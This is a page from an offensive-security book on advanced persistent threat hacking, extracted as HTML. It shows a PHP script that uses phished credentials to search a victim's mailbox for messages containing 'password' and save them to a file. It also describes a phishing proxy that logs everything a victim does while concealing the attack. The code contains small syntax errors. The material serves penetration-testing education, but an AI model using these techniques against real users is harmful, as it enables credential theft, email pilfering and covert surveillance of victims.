<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pfd5" class="pf w2 h2" data-page-no="d5"><div class="pc pcd5 w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">190<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x4 hd y11c ff4 fs7 fc0 sc0 ls1a ws0">Here’<span class="_ _2"/>s an example of searching for the string “password” in the body of all messages </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls1a ws0">in the inbox. This writes all of the identied messages into the passw<span class="_ _0"/>ord-e-mails.txt le. </div><div class="t m0 x3 hd y11e ff4 fs7 fc0 sc0 ls25 ws16">K<span class="_ _0"/>eep in mind that in the real world, again, we’<span class="_ _2"/>d want to add error-checking code as well </div><div class="t m0 x3 hd y15c ff4 fs7 fc0 sc0 ls1a ws0">as maybe clean up the output a little, but the core concept is here.</div><div class="t m0 x3 h44 y1001 fff fse fc0 sc0 ls0 ws0">&lt;?php</div><div class="t m0 x3 h44 y1002 fff fse fc0 sc0 ls0 ws0">$outFile = fopen ("password-e-mails.txt", 'a' );</div><div class="t m0 x3 h44 y1003 fff fse fc0 sc0 ls0 ws0">// search in the body of messages for 'password'</div><div class="t m0 x3 h44 y1004 fff fse fc0 sc0 ls0 ws0">$e-mails = imap_search($mbox, "BODY password");</div><div class="t m0 x3 h44 y139c fff fse fc0 sc0 ls0 ws0">foreach($e-mails as $e-mailNum){</div><div class="t m0 x3 h44 y139d fff fse fc0 sc0 ls0 ws0">  $msg = imap_fetch_overview($mbox,$e-mailNum,0);</div><div class="t m0 x3 h44 y1007 fff fse fc0 sc0 ls0 ws0">  $body = imap_fetchbody($mbox,$e-mailNum,1);</div><div class="t m0 x3 h44 y1432 fff fse fc0 sc0 ls0 ws0">  fwrite ($outFile, "Subject: " . $msg[0]-&gt;subject . " \n");</div><div class="t m0 x3 h44 y1433 fff fse fc0 sc0 ls0 ws0">  fwrite ($outFile, "From: " . $msg[0]-&gt;from . "\n");</div><div class="t m0 x3 h44 y1434 fff fse fc0 sc0 ls0 ws0">  fwrite ($outFile, "Date: " . $msg[0]-&gt;date . "\n";</div><div class="t m0 x3 h44 y1435 fff fse fc0 sc0 ls0 ws0">  print "body: $body \n\n\n";</div><div class="t m0 x3 h44 y1436 fff fse fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h44 y1437 fff fse fc0 sc0 ls0 ws0">fclose($outFile);</div><div class="t m0 x3 h44 y1438 fff fse fc0 sc0 ls0 ws0">?&gt;</div><div class="t m0 x4 hd y1439 ff4 fs7 fc0 sc0 ls0 ws0">W<span class="_ _3"/>e wouldn’t want to run this script as part of the login checking for the user<span class="_ _2"/>, </div><div class="t m0 x3 hd y143a ff4 fs7 fc0 sc0 ls0 ws0">as it would take w<span class="_ _0"/>ay too long to return to the user<span class="_ _2"/>. Instead, we want to send valid </div><div class="t m0 x3 hd y143b ff4 fs7 fc0 sc0 ls0 ws0">credentials to a script like this by forking to this script, which would allo<span class="_ _0"/>w this script </div><div class="t m0 x3 hd y143c ff4 fs7 fc0 sc0 ls0 ws0">to pilfer the user’<span class="_ _2"/>s e-mail in the background.</div><div class="t m0 x3 h7 y143d ff1 fs3 fc0 sc0 ls0 ws0">PHP-Phoxy (Phishing Proxy)</div><div class="t m0 x3 hd y143e ff4 fs7 fc0 sc0 ls0 ws0">Our nal option is to congure our phishing web server to act just lik<span class="_ _0"/>e a proxy<span class="_ _2"/>, a </div><div class="t m0 x3 hd y143f ff4 fs7 fc0 sc0 ls0 ws0">very basic proxy<span class="_ _3"/>, but a proxy nonetheless. <span class="_ _0"/>W<span class="_ _3"/>e’ll take the requests from the user<span class="_ _0"/>, pass </div><div class="t m0 x3 hd y1440 ff4 fs7 fc0 sc0 ls0 ws0">them to the remote system, and then return the results, all the while logging all of </div><div class="t m0 x3 hd y1441 ff4 fs7 fc0 sc0 ls0 ws0">the acti<span class="_ _0"/>vity<span class="_ _2"/>, as in Figure 6-1. Beyond just logging e<span class="_ _0"/>verything the user is doing, we </div><div class="t m0 x3 hd y1442 ff4 fs7 fc0 sc0 ls0 ws0">don’t ha<span class="_ _0"/>ve to w<span class="_ _0"/>orry about any of the real functionality of our website, which is an </div><div class="t m0 x3 hd y1443 ff4 fs7 fc0 sc0 ls0 ws0">added benet. <span class="_ _2"/>As in the previous examples, after the user has authenticated, we ha<span class="_ _0"/>v<span class="_ _0"/>e </div><div class="t m0 x3 hd y1444 ff4 fs7 fc0 sc0 ls0 ws0">to create additional pages so as to not alert the user that there are any issues. In this </div><div class="t m0 x3 hd y1445 ff4 fs7 fc0 sc0 ls0 ws0">case, the user is free to use the target website as intended.</div><div class="t m0 x4 hd y1446 ff4 fs7 fc0 sc0 ls1a ws0">Another great adv<span class="_ _0"/>antage with this method is that we can hav<span class="_ _0"/>e a v<span class="_ _0"/>alid SSL certicate,<span class="_ _1"/> </div><div class="t m0 x3 hd y1447 ff4 fs7 fc0 sc0 ls1a ws0">as the user will only be directly interacting with our web server<span class="_ _2"/>. Of course, we could </div><div class="t m0 x3 hd y1448 ff4 fs7 fc0 sc0 ls1a ws0">also use a myriad of other possible attack methods, such as SSL stripping, but we’<span class="_ _0"/>ll </div><div class="t m0 x3 hd y1449 ff4 fs7 fc0 sc0 ls1a ws0">cov<span class="_ _0"/>er additional man-in-the-middle techniques in a future chapter<span class="_ _2"/>.</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>